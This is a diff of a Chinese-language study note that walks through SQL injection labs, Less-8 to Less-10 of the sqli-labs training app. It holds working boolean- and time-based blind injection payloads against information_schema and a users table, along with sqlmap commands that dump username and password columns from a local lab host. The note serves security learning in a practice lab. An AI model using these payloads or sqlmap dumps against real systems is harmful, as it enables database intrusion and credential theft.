@@ -29,7 +29,7 @@ category: 笔记
 
 页面上不能返回具体的错误信息，因此使用布尔盲注
 
-**第一步盲注库名**
+**1.盲注库名**
 
 首先判断盲注数据库名长度
 
@@ -44,7 +44,7 @@ category: 笔记
 
 得到数据库名为`security`
 
-**第二步盲注表名**
+**2.盲注表名**
 
 首先判断`security`表的数量
 
@@ -64,7 +64,7 @@ category: 笔记
 
 通过更改limit值，可以推出其余三个表名`referers` `uagents` `users`
 
-**第三步盲注列名(字段名)**
+**3.盲注列名(字段名)**
 
 首先还是判断列的数量
 
@@ -81,7 +81,7 @@ category: 笔记
 
 同样的方法得到三列列名分别是`id` `username` `password`
 
-**第四步盲注数据**
+**4.盲注数据**
 
 表中用户数量
 
@@ -125,7 +125,7 @@ category: 笔记
 
 打开kali虚拟机
 
-1.指定注入点
+**1.指定注入点**
 
     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'"
 
@@ -133,7 +133,7 @@ category: 笔记
 ![](<https://img.remit.ee/i/Zw4kCq9rNGT6>)
 可以看到数据库版本等信息
 
-2.获取全部数据库
+**2.获取全部数据库**
 
     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" --dbs
 
@@ -147,7 +147,7 @@ category: 笔记
 
 可以看到是`security`
 
-3.获取表
+**3.获取表**
 
     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' --tables
 
@@ -155,17 +155,91 @@ category: 笔记
 
 可以看到表的数量及各自的名称
 
-4.获取字段
+**4.获取字段**
 
     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' --columns
 
 ![](<https://img.remit.ee/i/HBEr5WLYybUt>)
 
-5.获取数据
+**5.获取数据**
 
     sqlmap -u "http://192.168.170.1/sql/Less-8/?id=1'" -D 'security' -T 'users' -C 'username,password' --dump
 
 ![](<https://img.remit.ee/i/TCmLm6XllzJD>)
 
-OK了
+# 时间盲注
+## less-9
 
+发现无论我们输入什么页面都不能返回错误信息，因此考虑时间注入
+
+![](https://picgocloud.com/m/624d06f9-d985-431f-b325-d9cb009d8b35.png)
+
+我们构造
+
+    ?id=1' and if(1=1,sleep(5),1)--+
+
+发现页面延迟了5s才返回信息
+
+那么就判断出了闭合方式
+
+**1.库名**
+
+长度：
+
+    ?id=1'and if(length((select database()))=8,sleep(5),1)--+
+
+名称：
+
+    ?id=1' and if(substr(database(),1,1)='s',sleep(5),1)--+
+    ?id=1' and if(substr(database(),2,1)='e',sleep(5),1)--+
+    ...
+
+**2.表名**
+
+库中表的数量
+
+    ?id=1' and if((select count(table_name) from information_schema.tables where table_schema=database())=4,sleep(5),1) --+
+
+第一张表长度
+
+    ?id=1' and if(length((select table_name from information_schema.tables where table_schema=database() limit 0,1))=6,sleep(5),1) --+
+
+第一张表的名称
+
+    ?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)='e',sleep(5),1) --+
+    ?id=1' and if(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),2,1)='m',sleep(5),1) --+
+    ...
+
+**3.字段名**
+
+表中字段数量
+
+    ?id=1' and if((select count(column_name) from information_schema.columns where table_schema=database() and table_name='users')=3,sleep(5),1) --+
+
+第一个字段的长度
+
+    ?id=1' and if(length((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1))=2,sleep(5),1) --+
+
+第一个字段名称
+
+    ?id=1' and if(substr((select column_name from information_schema.columns where table_schema=database() and table_name='users' limit 0,1),1,1)='i',sleep(5),1) --+
+    ...
+
+**4.数据**
+
+表中用户数量
+
+    ?id=1' and if((select count(*) from security.users)=13,sleep(5),1)--+
+
+`users`这一列第一条记录的长度
+
+    ?id=1' and if(length((select username from users limit 0,1))=4,sleep(5),1) --+
+
+`users`这一列第一条记录的名称
+
+    ?id=1' and if((substr((select username from users limit 0,1),1,1))='D',sleep(5),1) --+
+    ...
+
+## less-10
+
+同less-9一致，仅闭合方式不同`"`
